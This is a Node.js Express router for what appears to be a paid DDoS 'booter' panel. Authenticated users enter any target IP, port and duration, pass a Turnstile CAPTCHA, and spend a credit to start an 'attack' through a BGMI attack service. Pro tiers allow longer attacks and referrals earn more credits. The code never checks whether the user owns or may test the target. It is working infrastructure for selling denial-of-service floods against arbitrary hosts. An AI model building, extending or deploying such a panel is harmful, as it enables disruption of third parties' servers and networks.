const express = require('express');
const router = express.Router();
const auth = require('../middleware/authMiddleware');
const User = require('../models/User');
const axios = require('axios');
const bgmiService = require('../services/bgmiService');

// ── In-memory attack tracker: userId → attack info ───────────────────────────
const activeAttacks = new Map();

// ── Captcha token blacklist ───────────────────────────────────────────────────
const usedCaptchaTokens = new Map();

function blacklistToken(token) {
    usedCaptchaTokens.set(token, Date.now() + 310_000);
    for (const [t, exp] of usedCaptchaTokens) {
        if (Date.now() > exp) usedCaptchaTokens.delete(t);
    }
}

function isTokenBlacklisted(token) {
    const exp = usedCaptchaTokens.get(token);
    if (!exp) return false;
    if (Date.now() > exp) { usedCaptchaTokens.delete(token); return false; }
    return true;
}

async function verifyTurnstile(token, ip) {
    if (!token || token.length < 10) return { success: false };
    if (isTokenBlacklisted(token)) return { success: false, 'error-codes': ['duplicate-use'] };
    try {
        const params = new URLSearchParams({
            secret: process.env.TURNSTILE_SECRET,
            response: token,
        });
        if (ip && ip !== '::1' && !ip.startsWith('::ffff:127')) {
            params.append('remoteip', ip);
        }
        const { data } = await axios.post(
            'https://challenges.cloudflare.com/turnstile/v0/siteverify',
            params,
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        if (data.success) blacklistToken(token);
        return data;
    } catch {
        return { success: false };
    }
}

// ─── GET /api/panel/me ────────────────────────────────────────────────────────
router.get('/me', auth, async (req, res) => {
    try {
        const user = await User.findById(req.user.id).select('-password');
        if (!user) return res.status(404).json({ message: 'User not found' });
        res.json(user);
    } catch {
        res.status(500).json({ message: 'Server error' });
    }
});

// ─── GET /api/panel/attack-status ────────────────────────────────────────────
router.get('/attack-status', auth, async (req, res) => {
    try {
        const attackInfo = activeAttacks.get(req.user.id.toString());

        if (!attackInfo) {
            return res.json({ success: true, data: { status: 'idle' } });
        }

        // Verify with the BGMI server that it's still running
        const statusResponse = await bgmiService.getStatus(attackInfo.bgmiServerUrl);

        if (!statusResponse.success || statusResponse.data?.status !== 'running') {
            activeAttacks.delete(req.user.id.toString());
            return res.json({ success: true, data: { status: 'idle' } });
        }

        return res.json({
            success: true,
            data: {
                status: 'running',
                ip: attackInfo.ip,
                port: attackInfo.port,
                duration: attackInfo.duration,
                startedAt: attackInfo.startedAt,
                bgmiServer: attackInfo.bgmiServerUrl
            }
        });
    } catch (err) {
        console.error('Attack status error:', err);
        res.status(500).json({ message: 'Server error. Please try again.' });
    }
});

// ─── POST /api/panel/stop-attack ─────────────────────────────────────────────
router.post('/stop-attack', auth, async (req, res) => {
    try {
        const attackInfo = activeAttacks.get(req.user.id.toString());

        if (!attackInfo) {
            return res.status(400).json({ message: 'No active attack found' });
        }

        const stopResponse = await bgmiService.stopServer(attackInfo.bgmiServerUrl);

        // Always remove from map regardless of stop result
        activeAttacks.delete(req.user.id.toString());

        if (!stopResponse.success) {
            return res.status(500).json({
                message: 'Failed to stop attack server',
                error: stopResponse.error
            });
        }

        return res.json({
            message: 'Attack stopped successfully',
            data: stopResponse.data
        });
    } catch (err) {
        console.error('Stop attack error:', err);
        res.status(500).json({ message: 'Server error. Please try again.' });
    }
});

// ─── POST /api/panel/attack ───────────────────────────────────────────────────
router.post('/attack', auth, async (req, res) => {
    try {
        const user = await User.findById(req.user.id).select('-password');
        if (!user) return res.status(404).json({ message: 'User not found' });

        const { ip, port, duration, captchaToken } = req.body;

        // Required fields
        if (!ip || !port || !duration) {
            return res.status(400).json({ message: 'IP, port, and duration are required' });
        }

        // IP validation
        const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
        if (!ipRegex.test(ip)) {
            return res.status(400).json({ message: 'Invalid IP address format' });
        }

        // CAPTCHA validation
        if (!captchaToken) {
            return res.status(400).json({ message: 'CAPTCHA is required' });
        }
        const captcha = await verifyTurnstile(captchaToken, req.ip);
        if (!captcha.success) {
            return res.status(400).json({
                message: captcha['error-codes']?.includes('duplicate-use')
                    ? 'CAPTCHA already used. Please solve it again.'
                    : 'CAPTCHA verification failed. Please try again.',
            });
        }

        // Port and duration validation
        const portNum = parseInt(port);
        const durNum = parseInt(duration);
        const MAX_DURATION = user.isPro ? 300 : 60;

        if (isNaN(portNum) || portNum < 1 || portNum > 65535) {
            return res.status(400).json({ message: 'Port must be between 1 and 65535' });
        }

        if (isNaN(durNum) || durNum < 1) {
            return res.status(400).json({ message: 'Duration must be at least 1 second' });
        }

        if (durNum > MAX_DURATION) {
            return res.status(403).json({
                message: user.isPro
                    ? 'Duration cannot exceed 300 seconds'
                    : 'Free accounts are limited to 60 seconds. Upgrade to Pro for up to 300 seconds.',
                maxDuration: MAX_DURATION,
                isPro: user.isPro,
            });
        }

        // Credit check
        if (user.credits < 1) {
            return res.status(403).json({
                message: 'Insufficient credits. Share your referral link to earn more.',
                credits: user.credits,
            });
        }

        // Block if user already has a running attack
        if (activeAttacks.has(user._id.toString())) {
            return res.status(400).json({
                message: 'You already have an attack running. Please stop it first.'
            });
        }

        // Start the BGMI server
        const bgmiResponse = await bgmiService.startServer(ip, portNum, durNum, 1);

        if (!bgmiResponse.success) {
            console.error('BGMI server start failed:', bgmiResponse.error);
            return res.status(500).json({
                message: 'Failed to start attack server',
                error: bgmiResponse.error
            });
        }

        // Register active attack
        const startedAt = new Date().toISOString();
        activeAttacks.set(user._id.toString(), {
            bgmiServerUrl: bgmiResponse.apiUrl,
            ip,
            port: portNum,
            duration: durNum,
            startedAt
        });

        // Auto-clear after duration expires (+5s buffer)
        setTimeout(() => {
            activeAttacks.delete(user._id.toString());
        }, durNum * 1000 + 5000);

        // Deduct credit
        const updated = await User.findByIdAndUpdate(
            user._id,
            { $inc: { credits: -1 } },
            { new: true }
        );

        console.log(`🚀 Attack launched by ${user.username} → ${ip}:${portNum} for ${durNum}s (isPro: ${user.isPro})`);

        return res.json({
            message: 'Attack launched successfully',
            attack: {
                ip,
                port: portNum,
                duration: durNum,
                bgmiServer: bgmiResponse.apiUrl,
                startedAt
            },
            credits: updated.credits,
            isPro: user.isPro,
        });

    } catch (err) {
        console.error('Attack error:', err);
        res.status(500).json({ message: 'Server error. Please try again.' });
    }
});

module.exports = router;